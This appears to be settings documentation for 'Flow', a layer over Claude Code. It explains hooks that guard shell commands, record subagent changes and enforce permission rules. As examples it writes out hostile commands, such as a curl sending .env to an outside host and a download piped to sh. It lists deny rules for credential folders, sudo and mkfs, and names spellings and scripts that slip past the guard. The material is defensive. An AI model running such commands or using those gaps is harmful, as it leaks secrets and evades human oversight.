# Settings

Flow reads 4 settings files. This page explains every key in each: what it does, the values Flow rejected, and why.

- **`~/.claude/settings.json`** belongs to Claude Code. Flow ships its keys in `home/settings.json`, and `flow setup` merges them in.
- **`~/.flow/settings.json`** belongs to Flow, and travels to your other machines with the rest of `~/.flow/`.
- **`~/.flow/settings.local.json`** belongs to Flow and to this machine alone. git ignores it.
- **`<project>/.flow/settings.json`** belongs to one project, and is committed with it.

Flow reads its 2 machine files as one, and the local one wins key by key.

All 4 are strict JSON, so none can hold a comment. This page holds the explanations instead.

## Table of contents

- [Claude Code's settings file](#claude-codes-settings-file)
  - [`hooks`](#hooks)
  - [`permissions`](#permissions)
  - [`skillOverrides`](#skilloverrides)
  - [`cleanupPeriodDays`](#cleanupperioddays)
  - [`fileSuggestion`](#filesuggestion)
  - [Feature flags](#feature-flags)
  - [Deliberately absent](#deliberately-absent)
- [Flow's settings files](#flows-settings-files)
  - [`sources`](#sources)
  - [`skills`](#skills)
  - [`skillsAutoUpdate`](#skillsautoupdate)
  - [`reminder`](#reminder)
  - [`sessionCheck`](#sessioncheck)
  - [`setupReminder`](#setupreminder)
  - [`setupReminderSkip`](#setupreminderskip)
  - [`wrapUp`](#wrapup)
  - [`wrapUpAt`](#wrapupat)
  - [`fileSuggestionIgnore`](#filesuggestionignore)

## Claude Code's settings file

`home/settings.json` is the template, and `flow setup` merges its keys into `~/.claude/settings.json`. Merged rather than copied: your global settings also hold personal things (model, effort level, plugins, statusline) that Flow shouldn't own.

Settings load at startup. **Restart Claude Code after any change.**

---

### `hooks`

```json
"hooks": { "PreToolUse": [ { "matcher": "Bash", "hooks": [
  { "type": "command", "command": "node \"$HOME/.flow/scripts/guard.js\"" } ] } ] }
```

Runs `scripts/guard.js` before every Bash call. The script reads the pending command on stdin, and answers `ask` or nothing.

**The guard is what stands between Claude and a dangerous command.** [`allow`](#allow) lets every shell command through, so a command runs unasked unless the guard, an [`ask` rule](#ask-6-commands-that-always-ask) or Claude Code's own checks stop it. A danger the guard does not know runs. [Why every shell command is allowed](#why-every-shell-command-is-allowed) covers that trade.

**The guard reads a command the way bash splits it.** A permission pattern such as `Bash(rm *)` matches the start of a command. The guard reads the whole of it. Loops, pipes, `$(…)`, backticks, here-docs, `bash -c '…'`, `eval` and `xargs` each reach its checks as a separate command. It peels wrappers such as `sudo`, `env`, `timeout` and `nohup` down to the program they run. It follows a `cd`, and a variable set earlier in the same command. A new shape of command needs no change to the guard. A new tool joins a kind of harm with one entry in a list inside the script.

**It asks before 5 kinds of harm:**

1. **Losing work on this machine.** A delete outside the project: `rm -rf ../other-project`. A delete of work git has no copy of: a changed file, a new file, or a file git ignores, such as `.env`. The git commands that throw work away: a force push, `reset --hard`, `clean`, `rebase`, `branch -D`, `stash drop`, and a `checkout` or `restore` over uncommitted changes.
2. **Sending data off the machine.** `curl` or `wget` sending data, such as `curl -d @.env https://example.com`. A copy to another host with `scp` or `rsync`. Every `ssh`.
3. **Touching shared systems.** 21 deploy and cloud tools, `kubectl`, `terraform`, `aws`, `gh` and `vercel` among them, whenever the command does more than read. A database wipe: `DROP TABLE`, `TRUNCATE`, `dropdb`, `prisma migrate reset`.
4. **Changing the machine outside the project.** A global install, such as `npm install -g` or a `pip install` outside a virtual environment. `crontab`, `systemctl`, `pkill`. A write into `~/.ssh`, a shell startup file such as `~/.bashrc`, or `~/.gitconfig`.
5. **Running outside code, or switching Flow off.** A download run straight away: `curl -fsSL https://example.com/install.sh | sh`. An `npx` of a package the project does not have. A write into `~/.claude`, `~/.flow`, `~/.agents` or the project's `.claude/settings.json`, where the guard itself is switched on.

**Inside the project, a delete asks only when nothing can bring the files back.** The guard asks `git status` which files under the target are changed, staged, new or ignored. None → the delete runs, since a committed file comes back with `git checkout`. An ignored file asks too, unless it sits in a folder a build or an install makes again: `node_modules/`, `dist/`, `build/`, `.next/`, a cache or a virtual environment. `tmp/` is left off that list on purpose, since scratch work there has no other copy. Outside git, the same list decides. 4 more calls:

- **Every delete outside the project asks**, with or without `-r` or `-f`, `/tmp` included.
- **A loop over plain words is read word by word.** `for f in notes.md; do rm "$f"; done` asks about `notes.md` by name. A loop over `$(…)` asks, since its words are only known when it runs.
- **A `find` that deletes runs first without deleting**, to list what would match, and the guard checks exactly those files. A listing that takes over 3 seconds asks.
- **A plain commit or push is left to the [`ask` rules](#ask-6-commands-that-always-ask).** Delete one of those rules and that command runs unasked.

**Where it cannot tell, it asks only when the unknown part decides a loss.** `rm -rf "$DIR"`, with `DIR` set somewhere the guard cannot see, asks. So does a program named by a variable, and anything fed to `xargs rm`. Anything else it cannot read stays silent. So does a command bash itself would refuse, such as one with an unclosed quote. A crash inside the guard asks when the command names a program such as `rm`, `git`, `curl` or `ssh`.

**It cannot see inside a script.** `node -e`, `python3 -c`, or a file Claude wrote and then runs, can do anything unasked. The guard catches the forms Claude writes at the prompt, and is no wall.

**Each prompt carries one line from the guard**, saying what the command does and why that matters: `Deletes notes.md, a new file git has no copy of`, or `Sends data to example.com`. The rest of the prompt is Claude Code's own and cannot be changed: a header saying a hook asked, a hint about settings, and Yes or No.

**The guard never answers `allow`.** Anything it stays silent on goes to Claude Code's own rules, so a bug in the guard can never let through more than the settings do.

Node, not Python. The hook inherits Claude Code's `PATH`, so a Node installed under nvm has to be on it, but `flow` and `util` are Node too, so that is already a hard requirement of the toolchain and this adds nothing new. What it removes is a third language in a five-file folder.

#### The change record

```json
"PreToolUse":         [ { "matcher": "^(Edit|Write|Bash)$|^mcp__", "hooks": [ { "type": "command",
  "command": "node \"$HOME/.flow/scripts/changes.js\"" } ] } ],
"PostToolUse":        [ { "matcher": "^(Edit|Write|Bash)$|^mcp__", "hooks": [ "…the same" ] },
                        { "matcher": "Agent|SendMessage", "hooks": [ { "type": "command",
  "command": "node \"$HOME/.flow/scripts/changes.js\" --wait", "asyncRewake": true, "timeout": 86400 } ] } ],
"PostToolUseFailure": [ { "matcher": "^(Edit|Write|Bash)$|^mcp__", "hooks": [ "…the same" ] } ],
"SubagentStart":      [ { "hooks": [ "…the same" ] } ],
"SubagentStop":       [ { "hooks": [ "…the same" ] } ]
```

Records what each subagent changed, and hands the parent a diff per file when the subagent finishes. A subagent's own report can leave things out. A plain `git diff` cannot separate its work from a tree that has been dirty for weeks, or from a second subagent editing at the same time.

**Every change is filed under the agent that made it.** A hook that fires inside a subagent carries the subagent's `agent_id`, and a hook in the main conversation carries none. So 3 workers editing at once each get only their own files:

- **`Edit` and `Write`**: the file is stored just before the call and just after it
- **`Bash` and every MCP tool**: the whole project is snapshotted just before the call and just after it. A snapshot is `git write-tree` against a throwaway index: every file at one moment, uncommitted work included, with the real index, the files and HEAD untouched. The record lists the command beside the files it changed, so a deleted file shows next to the `rm` that deleted it
- **A worker's whole run**: one snapshot at `SubagentStart` and one at `SubagentStop`. A change no tool call explains comes back under the note "Changed while this subagent ran, by no tool call a hook saw". A command left running in the background causes one, and so do an edit in your editor and a tool nothing hooks
- **The main conversation**: recorded only while a worker runs, so an edit the parent makes is never handed to a worker

**A waiter delivers the record.** A background subagent's `Agent` call returns the moment it launches, long before any change, so the `PostToolUse` hook on `Agent` starts a waiter in the background. When the subagent finishes, `SubagentStop` builds the record and gives the waiter up to 2 seconds to take it. The waiter exits with code 2, which `asyncRewake` turns into a message that wakes the parent even when it sits idle. The record lands just before the subagent's finished notice. A subagent that changed nothing sends none.

**Claude Code labels the message "Stop hook blocking error".** Nothing failed. The rule `change-record` in `home/AGENTS.md` tells every session so: without it, a parent in a test run read a record as a possible prompt injection.

**`SendMessage` starts a new waiter**, for a subagent the parent resumes. A subagent you resume by typing into its row has no waiter, so its record arrives with the parent's next `Edit`, `Write` or `Bash` call instead.

**The size stays bounded.** A deleted file shows its header, never its content. Past 9,000 characters the longest diffs shrink to line counts, such as `big.txt: +2000 -0`, and the record names a file holding the whole patch. Claude Code cuts hook output at 10,000.

**Records live under `~/.flow/changes/<session>/`**, never a temporary folder, so a subagent resumed after a crash hands over what it changed before the crash too. File contents go into git's own object store, so a record holds hashes. A session folder untouched for 7 days is deleted when the next subagent starts.

3 things it cannot see:

- **Anything outside a git repository.** Nothing is recorded there
- **A command's changes inside a submodule.** A snapshot holds a submodule as one commit. `Edit` and `Write` inside one are still recorded
- **A command's changes to a gitignored file.** `Edit` and `Write` on one are still recorded

**`git add` has to stay reachable.** The snapshot stages into a throwaway index, which touches no real git state. It runs as a hook rather than through the Bash tool, so neither `guard.js` nor a permission prompt ever sees it.

[The agents Claude Code runs](../dev/agents.md#what-a-subagent-changed) shows a real record.

#### The rule-check pair

```json
"PreToolUse":         [ { "matcher": "Edit|Write", "hooks": [ { "type": "command",
  "command": "node \"$HOME/.flow/scripts/rule-check.js\"" } ] } ],
"InstructionsLoaded": [ { "hooks": [ { "type": "command",
  "command": "node \"$HOME/.flow/scripts/instructions-loaded.js\"" } ] } ]
```

**One check exists, and it only measures.** `scripts/rule-checks/js-and-ts.js` counts a run of `//` lines above a function, and records the count without ever warning. More arrive one check file at a time.

`rule-check.js` runs every check in that folder against the pending edit and appends one line per result to `~/.flow/logs/scorecards/<session>.jsonl`. Each check carries its own tier: `measure` records silently, `warn` returns a line in `additionalContext`, `block` returns a `deny`. `flow scorecard` adds the counts up.

`instructions-loaded.js` records which `CLAUDE.md` files, the files they import, and rule files entered context. That is what decides the shape of a warning: the rule id alone when the rule's file is loaded, and the rule's whole text injected when it is not. Telling the agent to go read the file costs a turn and can be skipped.

**The hole this fills is file creation.** A `paths:`-scoped rule triggers when Claude *reads* a matching file, so writing `src/foo.ts` in a session that opened no `.ts` file leaves the TypeScript rules out of context entirely. `PreToolUse` fires on `Write` whatever loaded.

**It never returns `allow`, and it never fails closed.** An unexpected throw stays silent. It measures writing habits, and breaking every edit in a session over a bug in one check would cost far more than the counts are worth. `permissionDecisionReason` is used only on a deny, since on an allow it reaches the terminal and never Claude.

`InstructionsLoaded` has no decision control at all. Claude Code discards its output and ignores its exit code, so it records or it does not.

#### The ticket check

```json
"UserPromptExpansion": [ { "matcher": "^(flow:)?(groundwork|execute|prototype|debug|start)$", "hooks": [ { "type": "command",
  "command": "node \"$HOME/.flow/scripts/check-ticket.js\"" } ] } ]
```

Runs `scripts/check-ticket.js` when one of the 5 skills that take a ticket id is typed, before the skill's text is built. The script reads the first word typed. A word shaped like a ticket id, which is `t` then a digit, so `t047`, `t47` or the folder name `t047-parser-split`, is checked with `flow get`; when nothing matches, the command is blocked and `flow`'s own message is shown, so a typo costs one line instead of the whole skill. Any other first word passes untouched, which is what lets instructions be typed after the skill name.

Before the ticket, it checks setup. A machine where `flow setup` never finished is refused whatever was typed, since no other hook is installed there to catch it. A folder with no `.flow/` is refused only where a project is needed: a ticket id, or `/flow:start` with nothing after it, which shows the project's board. `/flow:groundwork` with free text and `/flow:start` with a path work in any folder.

The matcher accepts the name with or without the prefix. Flow's skills load as a plugin named `flow`, so the command reads `/flow:execute`, and the hook is handed the bare name `execute`. The optional `flow:` group means the hook still fires if a future Claude Code version passes the full name instead.

It fires only on what the user types. A skill the agent invokes, as `/flow:start` does when it routes, carries no id and never reaches it.

#### The overlay

```json
"UserPromptExpansion": [ …the ticket check…, { "hooks": [ { "type": "command",
  "command": "node \"$HOME/.flow/scripts/overlays.js\"" } ] } ],
"PostToolUse":         [ …the change record…, { "matcher": "^Skill$", "hooks": [ "…the same" ] } ]
```

Runs `scripts/overlays.js` each time a skill loads, and hands the agent the project's overlay for it. An overlay is `.flow/overlays/<name>.md`, a file where one project adds to a skill every project shares. [Overlays](reference.md#overlays) covers writing one.

A skill loads 2 ways, and each fires its own event:

- **You type it**, `/flow:execute`: `UserPromptExpansion`, with no matcher, so every typed skill reaches the script
- **The agent loads it**, a subagent included: `PostToolUse` on the `Skill` tool

The script drops a plugin's prefix from the name, so `/flow:execute` reads `execute.md` and `supabase:postgres` reads `postgres.md`. It works the same for Flow's skills, a standalone skill and a plugin's. The overlay arrives right after the skill's text, under one heading:

```text
# Overlay

Skip phase 3 here.
```

**No overlay prints nothing**, and so does a folder outside any project, or an error of the script's own. A skill must never break over a missing overlay.

**A subagent that preloads a skill gets no overlay.** A subagent definition's `skills:` line loads a skill when the subagent starts, with no `Skill` call for the hook to see. Flow ships no subagent that does.

#### The failure log

```json
"PostToolUseFailure": [ …the change record…, { "matcher": "^Bash$|^mcp__", "hooks": [ { "type": "command",
  "command": "node \"$HOME/.flow/scripts/failures.js\"" } ] } ],
"StopFailure":        [ { "hooks": [ "…the same" ] } ]
```

Runs `scripts/failures.js` when a tool call fails, and when an API error ends a turn. It adds one line to `~/.flow/logs/failures/<year>-<month>.jsonl` for a failed MCP tool, a failed Flow command or bundled script, and the API error. Every other shell command and every built-in tool is skipped, since a `grep` that finds nothing also exits with an error. It prints nothing and never stops the session. [The failure log](reference.md#the-failure-log) shows a line and says what else writes one.

#### The reminder

```json
"UserPromptSubmit":   [ { "hooks": [ { "type": "command",
  "command": "node \"$HOME/.flow/scripts/reminder.js\"" } ] } ]
```

Prints one line beside every message you send:

```text
Follow `## The reply`, and pass every `### Before sending` test. If it applies, follow `## Capture`.
```

The rules for writing a reply sit at the end of a long file, loaded once at the start of a session. By turn 15 they are far behind the conversation, and the reply drifts back to long, compressed and undefined. A line arriving with the message puts them back in front of the agent. `## Capture` is named for the same reason, and only where a checkpoint makes it apply.

**It points at the rules, never repeats them.** A reminder listing rules grows with every rule and drifts from the file it copies.

**The text is a file, and the script only prints it.** Claude Code adds whatever a `UserPromptSubmit` hook prints to standard output beside the message. The hook cannot change the message itself. Edit `references/reminder.md` to change the line.

**`scripts/reminder.js` runs it, so it can be switched off.** `"reminder": false` in `~/.flow/settings.json` silences it, and [`reminder`](#reminder) covers the switch. The hook was a bare `cat` of the file until 2026-09-20, and `cat` reads no setting.

#### The wrap-up

```json
"UserPromptSubmit":   [ { "hooks": [ …the reminder…, { "type": "command",
  "command": "node \"$HOME/.flow/scripts/context-check.js\"" } ] } ],
"PostToolBatch":      [ { "hooks": [ { "type": "command",
  "command": "node \"$HOME/.flow/scripts/context-check.js\"" } ] } ]
```

Tells the agent to stop at a safe point and write a handoff once the conversation passes 150,000 tokens:

```text
The context is at 152k. At the next checkpoint, run /flow:handoff, report in full, and stop.
```

**The limit follows the work, never the window.** Answers get worse long before a 1-million-token window fills, and Claude Code's own summary waits until about 967,000. A session in Flow starts at about 25,000 before any work, so 150,000 leaves room for about 110,000 of it. The agent runs 10,000 to 20,000 past the limit while it reaches a checkpoint. [`wrapUpAt`](#wrapupat) moves the limit.

**Every 20,000 tokens past the limit it speaks again, firmer.** An agent deep in a long build tends to finish the whole job first, so the later line names the step in hand:

```text
The context is at 171k, past the 150k limit. Stop at the step you are on: finish it, run /flow:handoff, report, and stop.
```

**A checkpoint is where `## Capture` in `~/.agents/AGENTS.md` says one is**: a handoff, finished work reported, a groundwork branch closed, or a plan step landed and verified. `/flow:handoff` sweeps the conversation for what is worth keeping before it writes, so nothing waits for the summary.

**The size comes from the session file.** No hook input carries it. Every assistant message in `~/.claude/projects/<project>/<session-id>.jsonl` records its token count, and the script reads the last 2 from the end of the file, which can pass 100 MB. It speaks when a limit falls between those 2 counts, so it keeps no state of its own.

**It runs on 2 events, since each message is followed by exactly one of them.** A message that calls tools is followed by `PostToolBatch`, which fires once per batch of tool calls, where `PostToolUse` fires once per tool. A message that ends a turn is followed by your next one, `UserPromptSubmit`. A long build makes no user turns at all, and a conversation with no tool calls makes no batches.

**A helper agent's tool calls are skipped.** They fire the same hook, carrying the main session's file, so their counts would be the wrong ones.

`"wrapUp": false` in `~/.flow/settings.json` silences it, and [`wrapUp`](#wrapup) covers the switch.

#### The session check

```json
"SessionStart":       [ { "hooks": [ { "type": "command",
  "command": "node \"$HOME/.flow/scripts/session-check.js\"" } ] } ]
```

Prints one line when this machine or this project needs attention, and nothing at all when neither does:

```text
Flow: this machine is at changelog entry 3, and 5 is the newest. Run flow up in a terminal to catch up.
Flow: delapse is at changelog entry 3, and this machine is at 5. Run flow up in a terminal, inside it.
Flow: a migrate run stopped after step 4, so this machine is part way through a change. To carry on, run flow up in a terminal. flow doctor names the way back.
Flow: domain-skills is behind. 2 skills changed: react, sql. Update it when you want them, or set "skillsAutoUpdate": true.
```

Its lines come from 4 files, and it waits for no network call: `~/.flow/run.json`, which a setup or a migration leaves behind only when it never finished, `~/.flow/version`, the project's `.flow/version`, and `~/.flow/skills-update.json`, which the background pull below writes. It also reads your other machines' records from the last fetch of your Flow home, which git keeps on disk.

**Another machine on a newer release gets its own line**, since [`flow sync`](reference.md#flow-sync) waits until this machine catches up:

```text
Flow: desktop-wsl is on changelog entry 12, and this machine is on 11, so flow sync waits. Run flow up in a terminal.
```

[`flow doctor`](reference.md#flow-doctor) stays the full check of the machine, and `flow doctor --tests` adds both test suites.

**A stopped run silences the other version lines.** Each of them reads a version stamp that the stopped run was in the middle of moving, so finishing the run is the only thing worth saying about Flow's own version. A skill repository's line is a separate record and still prints.

**In a git repository Flow is not set up in, it suggests setting Flow up**, as a line shown to you and never to the agent:

```text
Flow: not set up here. Run flow setup project to add it, or flow settings off setupReminder to stop this.
```

It shows in every session opened there, anywhere inside the repository, until the project is set up or a setting stops it. Not every folder is a project, so a folder git does not track never gets it, and neither do the home folder and `~/.flow/`, which are repositories and never projects. [`setupReminder`](#setupreminder) turns it off everywhere, and [`setupReminderSkip`](#setupreminderskip) in chosen folders. [`flow settings`](reference.md#flow-settings) writes either one for you.

**In a project set up on another machine, it suggests folding in this machine's old memory**, when Claude Code kept memory for the project here before Flow. The line is shown to you alone, and the same 2 settings stop it:

```text
Flow: old Claude Code memory here. Run flow setup project to fold it in.
```

**It also makes every skill link match the settings.** A switch you made on another machine arrives through [`flow sync`](reference.md#flow-sync) as a line in `~/.flow/settings.json`, and the next session start makes the link. When a link changed, it asks Claude Code to scan the skill folders again. [`skills`](#skills) covers the lines.

**It also sends every skill repository to update itself**, by starting `~/.flow/scripts/skills-pull.js` in the background and returning at once. The same job fetches your Flow home's repository, at most every 6 hours, which is where the line about another machine comes from. It fetches only: [`flow sync`](reference.md#flow-sync) is what brings the files down. A session never waits for the network, and whatever that pull finds is printed by the session after it. [`skillsAutoUpdate`](#skillsautoupdate) covers the pull, its 2 guards and the switch.

`"sessionCheck": false` in `~/.flow/settings.json` silences it, and [`sessionCheck`](#sessioncheck) covers the switch.

#### Why worktree isolation is off

`EnterWorktree` and `Agent(isolation:worktree)` both move an agent's edits into a worktree: a second checkout of the repository in its own folder, on its own branch. The change record already keeps parallel workers apart inside one folder. A worktree starts from a commit, so all it would add is a worker that cannot see your uncommitted work.

`Agent(isolation:worktree)` is a scoped rule rather than a bare name, so the Agent tool stays available and only that one parameter value is blocked.

**`worktree.bgIsolation` closes the same door from the other side.** Its default, `"worktree"`, blocks `Edit` and `Write` in the main checkout until `EnterWorktree` runs, and `EnterWorktree` is denied above, so a background session would read files and run commands and never write a fix. `"none"` lets it edit the working copy directly. The `debug` agent runs as one of those sessions, and isolation is wrong for debugging anyway: the bug often lives in uncommitted state that a fresh worktree does not carry.

---

### `permissions`

Rules evaluate **deny → ask → allow**, first match wins. A broad deny beats a narrower allow. Deny rules hold in every permission mode.

#### `allow`

| Entry | Covers |
|---|---|
| `Edit` | every file-editing tool, including Write |
| `Read` | every file read, in any folder |
| `WebFetch` | every domain |
| `WebSearch` | every search |
| `Bash` | every shell command, with loops, variables, `$(…)` and pipes included |

A tool name written **without parentheses matches every use of that tool**.

**A shell command asks you in 5 cases only:**

- **The guard asks**, before one of its [5 kinds of harm](#hooks)
- **An [`ask` rule](#ask-6-commands-that-always-ask) matches**: a commit, a push or a publish
- **A redirect or a `tee` writes outside the working directory**, or to a target starting with `~` or holding a glob. Claude Code checks a write's target as if Claude edited that file, whatever the allow list says
- **A write lands in a protected path**: `.git`, `.claude`, `.vscode`, `.idea`, `.husky` and friends. No allow rule can pre-approve one
- **An `rm` aims at a critical path**, such as `/` or your home folder. No rule and no hook can approve one

**`Read` is blanket.** Without it, a read outside the project asks you. Approving one read saves a rule for that one folder, and the next folder asks again.

**Spawning a subagent never prompts, so `Agent` needs no entry.** Claude Code checks a subagent's own tool calls against these same rules while it works, and that is what governs a worker.

#### Why every shell command is allowed

Decided by the user 2026-09-28, after 2 designs that listed safe commands failed in real sessions.

**A list of safe programs failed on the shape of a command.** From 2026-09-25, `allow` named each routine program: `Bash(node *)`, `Bash(grep *)`, `Bash(npm test *)` and so on. Claude Code asks about a command holding a loop, a variable or a `$(…)` even when every program in it is on the list, and no rule can match that. This loop asked, although `echo` was on the list and `wc` only reads:

```sh
for f in docs/*.md; do echo "$f"; wc -l "$f"; done
```

"Yes, don't ask again" saves a command like that word for word, so the next loop asks again.

**A hook that approved safe shapes failed the same way.** `approve.js`, built and removed on 2026-09-28, read the whole command and allowed it when every program in it was on the list. Claude writes shell in endless shapes, and every shape the hook had not been written for asked again. Its first live session hit one within minutes: `wc -l < "$f"` inside a loop. Each miss meant editing the script.

**Allowing everything moves the gaps to where they are rare.** Safe shapes are endless and change every day. The kinds of danger are few and change slowly: losing work, sending data off the machine, touching a shared system, changing the machine, running outside code, and a commit, a push or a publish. The guard and the `ask` rules name those.

**The cost is a danger nothing names, which now runs without asking.** Before, a gap cost one extra question. Now it costs a command you never saw. A deploy tool missing from the guard's list runs unasked until you add an `ask` rule for it, and so does a script Claude writes and then runs. The old list already allowed `Bash(node *)`, `Bash(python3 *)` and `Bash(bash *)`, and any of those runs a script that can do anything, so its questions never covered much.

**2 other ways to stop the prompts were rejected:**

- **Auto mode**, where a second model judges each call. [Modes](#modes) gives the 4 reasons.
- **Claude Code's sandbox**, a wall the operating system puts around every shell command, which then runs unasked inside it. It needs bubblewrap and socat on Linux and WSL, and never runs on Windows outside WSL. Inside it docker, dev containers, jest's file watcher and package caches outside the project break, and Claude Code's own settings files cannot be written. A command that fails inside the wall is retried outside it, and the retry asks.

#### `ask`: 6 commands that always ask

```json
"ask": ["Bash(git commit *)", "Bash(git push *)", "Bash(npm publish *)",
        "Bash(pnpm publish *)", "Bash(yarn publish *)", "Bash(cargo publish *)"]
```

**Each one puts work where other people see it.** A commit becomes history others pull, a push sends it to the remote, and a publish puts a package in front of everyone who installs it.

A pattern ending in ` *` matches the command with anything after it, or with nothing: `Bash(git push *)` covers `git push` and `git push origin main`, and never `git pushx`.

**Claude Code finds them anywhere in a command**, inside a loop, a `$(…)` or after a `cd`. It misses another spelling of the same command: `git -C . push` and `bash -c 'git push'` run unasked.

**An `ask` rule beats every allow rule, a saved "don't ask again" included.** Commits ask every time, however often you approve one. To let them run, delete `"Bash(git commit *)"` from the `ask` list in `~/.claude/settings.json`. To add a command, add a line in the same shape, such as `"Bash(make deploy *)"`.

**Every other git write runs unasked**: a merge, a new branch, a stash, a checkout. The guard still asks before the ones that throw work away, since it reads the flags a pattern cannot.

#### `deny`: Claude Code surfaces Flow doesn't use

These are **bare tool names**, which removes each tool from the model's context entirely rather than blocking it at call time. That also drops its schema from every request: `DesignSync` alone measured ~2,200 tokens.

| Entry | Why |
|---|---|
| `EnterPlanMode`, `ExitPlanMode` | Flow owns planning: `/flow:groundwork` → tickets → the ticket's `plan.md`. Built-in plan mode also blocks the file writes those phases depend on. |
| `AskUserQuestion` | Presents a canned multiple-choice list. Flow's rule is the inverse: the agent commits to a recommendation and the user reacts. |
| `ListAgents` | Finds other Claude Code sessions to message. Flow messages its own subagents by id, and nothing else. |
| `PushNotification`, `ScheduleWakeup`, `RemoteTrigger`, `ReportFindings` | Out-of-band and unattended operation. One author, one terminal, every session watched. |
| `SendUserFile`, `ShareOnboardingGuide` | Send a file off the machine, to a device or behind a public link. Same reason, plus the work is not the agent's to publish. |
| `CronCreate`, `CronDelete`, `CronList` | Scheduled background jobs. Same reason. |
| `NotebookEdit` | Jupyter notebooks. Not in any workflow here. |
| `DesignSync` | Design-tool sync. Unused, and absent from the published tool reference, so it was found by logging a real request rather than by reading the docs. |

**`SendMessage` stays allowed.** A parent resumes a finished subagent with it, after a crash too.

**`Agent(fork)` is a scoped rule**, like `Agent(isolation:worktree)` above, so it blocks one subagent type and leaves the Agent tool alone. A fork is a subagent that starts with a copy of the whole conversation, and Claude Code starts one on its own in an interactive session. Flow never uses one: every agent Flow starts sees only what its prompt gives it.

#### `deny`: 2 folders holding keys

```json
"deny": ["Read(~/.ssh/**)", "Read(~/.aws/**)"]
```

**Every read is allowed, so these 2 folders are walled off by name.** `~/.ssh` holds the keys that log you into servers and git hosts. `~/.aws` holds cloud credentials.

A `Read` deny rule blocks the `Read` tool, and an edit to a file there. It also blocks the shell commands Claude Code recognizes as reads: `cat`, `head`, `tail`, `sed` and `grep`. It cannot see a script that opens files itself, such as `util fs merge` or a python one-liner.

#### `deny`: 4 commands no session should run

```json
"deny": ["Bash(sudo *)", "Bash(su *)", "Bash(mkfs*)", "Bash(* --dangerously-skip-permissions *)"]
```

- **`sudo`** runs a command as the system's administrator, with no limit on what it can change
- **`su`** logs the shell in as another user, the administrator by default, with the same reach as `sudo`
- **`mkfs`** formats a disk. The pattern has no space before the `*`, so it also covers the named forms such as `mkfs.ext4`
- **`--dangerously-skip-permissions`** starts a second Claude Code that never asks about anything. The leading `*` catches the flag wherever it sits in the command

A deny rule holds in every mode, and a saved allow cannot lift it. Run any of the 4 yourself, in your own terminal.

#### `deny`: the 2 commands that undo Flow

```json
"deny": ["Bash(flow restore machine:*)", "Bash(flow uninstall:*)"]
```

`flow restore machine`, `flow restore project` and `flow uninstall` put your machine back as it was before Flow, which means deleting files that have no other copy. Each is denied under both typed names, `flow` and `fw`, and under the path form `node ~/.flow/scripts/flow/flow.js`.

This is the 4th of 4 locks, and the weakest: a prefix rule cannot name every way a path can be written. The other 3 do not depend on it. The command refuses while any Claude Code or Codex session is running, it reads its confirming word from `/dev/tty` rather than from its input, and it takes no flag that skips the question. An agent fails the first 2 on its own, `!` inside a session included. [Reference](reference.md#flow-restore-machine-and-flow-restore-project) covers all 4.

`flow restore ls` is left allowed. It prints what has been recorded and changes nothing.

#### Modes

```json
"permissions": { "defaultMode": "default" }
```

Six of them, cycled with Shift+Tab and overridable for one session with `--permission-mode <name>`. A mode only decides what happens to a call no rule above matched.

**Every session starts in `default`, labelled Manual.** Every shell command is allowed, so the only prompts left are the 5 cases under [`allow`](#allow). The key has to be there. Since Claude Code 2.1.228, a terminal session on a Pro, Max or Team plan starts in `auto` unless a settings file names another mode. `flow doctor` fails when the key is missing, and prints a note when it names another mode.

**`auto` is not where a session starts, and not how Flow stops the prompts.** In auto mode a second model, the classifier, reviews a call before it runs and blocks what looks beyond your request. Ruled out by the user 2026-09-28, for 4 reasons:

- **It costs extra.** Every call it reviews is judged by a second model. Anthropic's permission modes page says those calls count toward usage on Enterprise plans and API accounts.
- **Its review fails on its own.** When the check reaches no verdict, Claude Code blocks the call, with a message that auto mode "cannot determine the safety" of it or that the server returned no safety verdict. Flow sessions have hit both.
- **It blocks what you already agreed to.** The classifier judges the command, and misses the conversation that led to it. An edit to a settings file or a delete that you approved a message earlier gets blocked as destructive, or as Claude changing its own setup. It refused Flow's own `~/.flow/run.json` that way. Every block costs you a question anyway.
- **It pulls against Flow's first rule.** The same page says auto mode nudges the model to "keep working without stopping for clarifying questions". `instruction-or-thinking` in `home/AGENTS.md` says a message that is not an instruction gets a reply and no edit.

**Entering auto mode also sets the bare `Bash` rule aside**, as it does every allow rule that can run any code. Every shell command then waits for the classifier.

**The guard and the `ask` rules work in either mode.** Both still force a prompt in auto mode. The classifier can add a block and never remove one.

**`auto` and `dontAsk` are the 2 unattended modes.** Reach for either with Shift+Tab, never by setting it here. `auto` catches what the guard never looks for, such as a script Claude wrote and then runs. `dontAsk` denies whatever would have asked you, with no second model, so a long run finishes and every denial shows up in the transcript.

**`acceptEdits` buys nothing.** It lets edits and a few file commands through, and the allow list already covers every edit and every shell command.

**`bypassPermissions` is locked out**, by `permissions.disableBypassPermissionsMode: "disable"`. Its one addition over `acceptEdits` is silent writes into `.claude` and `.git`, and Flow's settings, subagents and links all sit in `.claude`. The same key disables the `--dangerously-skip-permissions` flag, which the deny list above also blocks as a shell command, and makes Claude Code ignore `permissionMode: bypassPermissions` in any agent definition.

---

### `skillOverrides`

```json
"skillOverrides": { "code-reviewer": "off" }
```

**Claude Code's key for hiding a skill from the model.** Set to `off`, a skill's description never enters a session, and typing it fails with *disabled via skillOverrides*. `home/settings.json` ships no entry. `flow setup` writes one for each skill synced from your Claude account that works against Flow's rules. Claude Code's own skills, `/batch` among them, are already off through `disableBundledSkills`.

**[`flow skills`](reference.md#flow-skills) never writes it.** Flow switches its own skills, and the ones from skill repositories, by adding and removing links. 2 reasons decided against this key:

- **It does not reach Flow's own skills.** Flow's skills load as a plugin, and Claude Code's settings page rules the key out for those: *Does not apply to plugin skills, which are managed through `/plugin`*.
- **A removed link costs the same as `off`.** A skill with no link is never found, so its description costs nothing either. One mechanism for every source beats 2.

**It stays yours for every skill Flow did not install**: a plugin's, or one another tool wrote into `~/.claude/skills/`. A project's `.claude/settings.json` can override the machine's file here, name by name.

---

### `cleanupPeriodDays`

```json
"cleanupPeriodDays": 365
```

Claude Code deletes session data older than this at startup, and the default is 30 days. What it takes is the whole record of how a session ran: `~/.claude/projects/<project>/<session>.jsonl`, the `subagents/` transcripts beneath it, the `tool-results/` spill, plus `file-history/`, `plans/`, `debug/` and `paste-cache/`.

**Flow raises it because the transcript is evidence.** A study case exists to preserve an artifact that would be gone tomorrow, and the transcript is where that artifact actually lives. At 30 days, a rule written last month can no longer be traced back to the session that caused it.

365 rather than a decade, because the sweep is the only thing bounding this folder. A month of real work runs to roughly 300 MB, so a year costs a few gigabytes and ten years costs tens. Raise it once something prunes deliberately.

